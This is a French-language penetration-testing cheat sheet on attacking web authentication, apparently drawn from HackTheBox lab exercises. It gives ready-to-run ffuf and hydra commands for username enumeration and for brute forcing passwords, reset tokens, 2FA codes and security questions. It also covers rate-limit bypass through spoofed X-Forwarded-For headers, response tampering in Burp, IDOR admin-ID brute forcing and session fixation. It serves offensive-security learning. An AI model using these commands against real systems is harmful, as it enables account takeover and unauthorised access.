

### 3 types d'Authentification

1. Knowledge-based Authentication (password, pin...) -> Social engineering, bruteforce, data breach
2. Ownership-based Authentication (yubikey, Authenticator, Token, badge) -> Sensible aux vols et aux copies
3. Inherence-based Authentication (biométrie) -> Data Breach -> compromission a vie (empreinte, visage etc...)


- [ ] [[#Default Credentials]]
- [ ] [[#Brute Force]]
- [ ] [[#Vulnerable Password Reset]]
- [ ] [[#Bypass d'Authentification]]
- [ ] [[#Attaques sur sessions]]

---
# Default Credentials

Tester les default creds dans un premier temps

Resources:

https://www.cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv
https://github.com/ihebski/DefaultCreds-cheat-sheet/tree/main

# Brute Force

## Enumération d'utilisateurs

réponse différente si le user indiqué existe ou non 

#FFUF

```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

#HYDRA

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt <ip> -s <port> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -I -f -V
```

## Enumération d'utilisateurs via Side-Channel Attacks

temps de réponse différent si le user indiqué existe ou non 


## Bruteforce de password

[[Login BRUTE FORCE]]


## Bruteforce de password #ResetToken

Créer un compte sur l'application et demander un token de réinitialisation de mot de passe afin de l'analyser. Puis faire une nouvelle requête avec le compte cible avant de le bruteforce.

```bash
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

## Bruteforce #2FA codes

1. Générer wordlist -> [[Wordlists & Rules#SEQ]]

2. Bruteforce

```bash
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

## Weak Brute-Force Protection

### Rate Limits

Limite le nombre de requêtes

Si Header HTTP ==X-Forwarded-For==, randomiser la valeur peut permettre de bypasser la rate limit (qui se base sur l'IP).

### Captcha

Vérifier si le captcha n'est pas présent dans l'inspecteur d'élément

Tester des open-source CAPTCHA solvers

---
# Vulnerable Password Reset

## Guessable Password Reset Questions

Wordlist de villes

https://github.com/datasets/world-cities/blob/main/data/world-cities.csv

```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

Bruteforce avec ffuf

```bash
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```

## Manipulating the Reset Request

Etudier les requêtes et voir si paramètres cachés modifiables.


---

# Bypass d'Authentification

## Direct Access

> [!TIP]
> Tester d'accéder à des ressources non autorisées en modifiant le statut de la réponse dans BURP

Intercepter réponses aux requêtes avec burp et changer le ==302 Found== en ==200 OK== par exemple

## Parameter Modification

> [!TIP]
> Lié à des problèmes d'autorisation tels que IDOR (Insecure Direct Object Reference)

Si possible de s'authentifier directement avec un paramètre tel que user_id= , possible de bruteforcer le paramètre pour trouver un compte administrateur.

```bash
ffuf -w tokens.txt -u 'http://94.237.49.98:51125/admin.php?user_id=FUZZ' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.49.98:51125/' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=8h9q1ivv39isqgg8hqtlblf8g1' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' -fr "Could not load admin data."
```


---

# Attaques sur sessions

## Session Tokens

> [!TIP]
> Si chiffrement utilisé faible (token court, ou données statiques ne randomisant pas assez le token -> entropy insuffisante)
> 
> Capturer plusieurs token pour les analyser

exemples :

```
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

```
141233
141234
141237
141238
141240
```

Décoder cookie Base64

```bash
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
```

## Session Fixation

> [!TIP]
> Générer un cookie de session et forger une requête avec ce cookie de session afin de l'envoyer à la victime.
> Il sera par la suite possible d'hijacker la session de la victime grâce au cookie en question
> Les tokens de sessions doivent être regénérés aléatoirement après chaque authent réussie pour prévenir l'attaque
> Un token doit également avoir un timeout afin de faire expirer la session





